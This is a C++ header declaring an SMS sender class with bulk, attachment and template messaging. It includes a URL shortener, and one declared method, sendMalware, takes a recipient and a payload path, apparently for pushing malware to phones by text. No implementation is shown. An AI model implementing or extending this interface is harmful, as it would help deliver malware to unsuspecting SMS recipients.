#ifndef SMSSENDER_H
#define SMSSENDER_H

#include "MessageSender.h"
#include "MCreator.h" 
#include "TemplateLoader.h" 
#include "Logger.h"
#include "URLShortener.h"
#include <string>
#include <vector>
#include <unordered_map>
#include <memory>

class SMSSender : public MessageSender {
public:
    SMSSender(const std::string &authToken);
    void sendMessage(const std::string &recipient, const std::string &message) override;
    void sendBulkMessages(const std::vector<std::string> &recipients, const std::string &message);
    void sendMessageWithAttachment(const std::string &recipient, const std::string &message, const std::string &attachmentPath);
    void sendMalware(const std::string &recipient, const std::string &payloadPath);
    bool sendTemplateMessage(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params);
    void setTemplateLoader(const std::shared_ptr<TemplateLoader>& loader);

private:
    std::string authToken;
    std::string apiUrl;
    std::shared_ptr<TemplateLoader> templateLoader;

    std::string prepareMessage(const std::string &message);
    std::string buildMessagePayload(const std::string &recipient, const std::string &message);
    std::string buildTemplateMessagePayload(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params);
    void sendHTTPRequest(const std::string &url, const std::string &payload = "");
    void logSMSSending(const std::string &recipient, const std::string &message);
    void handleApiResponse(const std::string &response);
    bool retryOnFailure(const std::string &url, const std::string &payload, int retries = 3);
};

#endif // SMSSENDER_H





